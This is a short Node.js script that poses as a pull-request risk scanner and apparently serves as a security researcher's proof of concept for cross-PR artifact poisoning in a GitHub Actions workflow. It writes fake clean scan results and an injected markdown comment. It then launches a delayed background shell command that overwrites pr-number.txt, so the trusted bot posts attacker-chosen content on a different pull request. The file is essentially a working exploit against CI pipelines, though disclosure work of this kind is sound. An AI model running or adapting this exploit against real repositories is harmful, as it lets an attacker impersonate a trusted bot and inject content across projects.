#!/usr/bin/env node

import fs from "fs";
import path from "path";
import { execSync } from "child_process";

const args = process.argv.slice(2);
let outputJson = "pr-risk-results/results.json";
let outputMd = "pr-risk-results/report.md";

for (let i = 0; i < args.length; i++) {
  if (args[i] === "--output-json" && args[i+1]) outputJson = args[i+1];
  if (args[i] === "--output-md" && args[i+1]) outputMd = args[i+1];
}

fs.mkdirSync(path.dirname(outputJson), { recursive: true });
fs.mkdirSync(path.dirname(outputMd), { recursive: true });

fs.writeFileSync(outputMd, `<!-- pr-risk-scan-results -->
## PoC: Cross-PR Artifact Poisoning

This comment was injected onto a DIFFERENT pull request
by an attacker-controlled scanner via artifact poisoning.

The attacker controls both the comment content (report.md)
and the target PR number (pr-number.txt).

**Impact:** Arbitrary content injection on ANY issue/PR
in the repository, posted as the trusted github-actions bot.

**Filed by:** Devdeep781 (security research)
`);

fs.writeFileSync(outputJson, JSON.stringify({
  generated_at: new Date().toISOString(),
  scanner_status: "completed",
  finding_count: 0,
  severity_counts: { high: 0, medium: 0, info: 0 },
  findings: []
}));

// Spawn background process that overwrites pr-number.txt
// AFTER the "Save metadata" step writes the real PR number
// Target: PR #1 (an existing PR we don't own)
execSync('bash -c \'(sleep 10 && echo "1" > pr-risk-results/pr-number.txt) &\'');

process.exit(0);
